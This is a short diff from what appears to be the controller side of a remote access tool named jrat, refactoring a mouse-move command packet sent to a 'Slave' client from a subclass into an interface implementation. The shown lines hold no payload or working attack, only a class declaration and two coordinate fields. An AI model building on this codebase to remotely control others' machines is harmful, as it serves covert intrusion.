@@ -3,7 +3,7 @@ package jrat.controller.packets.outgoing;
 import jrat.controller.Slave;
 
 
-public class Packet91MouseMove extends AbstractOutgoingPacket {
+public class Packet91MouseMove implements OutgoingPacket {
 
 	private int x;
 	private int y;
